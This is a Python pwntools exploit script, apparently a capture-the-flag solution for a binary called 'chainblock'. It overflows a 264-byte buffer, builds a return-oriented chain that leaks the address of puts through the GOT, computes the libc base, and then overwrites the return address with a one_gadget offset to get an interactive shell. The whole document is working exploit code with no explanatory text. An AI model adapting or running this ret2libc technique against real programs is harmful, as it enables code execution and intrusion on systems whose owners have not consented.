from pwn import *

f = process("./chainblock")
elf = ELF("./chainblock")
libc = ELF("./libc.so.6")
rop = ROP("./chainblock")

# f = remote("pwn.be.ax",5000)

pop_rdi_ret = (rop.find_gadget(['pop rdi', 'ret']))[0]
main = elf.symbols['main']
puts = elf.plt['puts']
got = elf.got['puts']

payload = ""
payload += "A"*264
payload += p64(pop_rdi_ret)
payload += p64(got)
payload += p64(puts)
payload += p64(main)

if len(sys.argv) > 2:
	gdb.attach(f, "b *main+484\nc")

f.sendline(payload)
f.recvuntil("wrong identity!")
f.recvline()

leak = f.recvline().strip()
leak = leak.ljust(8, "\x00")
leak = u64(leak)

base_addr = leak - libc.symbols['puts']

one_gadget = base_addr + 0xde78f

log.info("puts() at : " + str(hex(leak)))
log.info("libc base @ %s" % hex(base_addr))

pause()

payload = ""
payload += "A"*264
payload += p64(one_gadget)
f.sendline(payload)

f.interactive()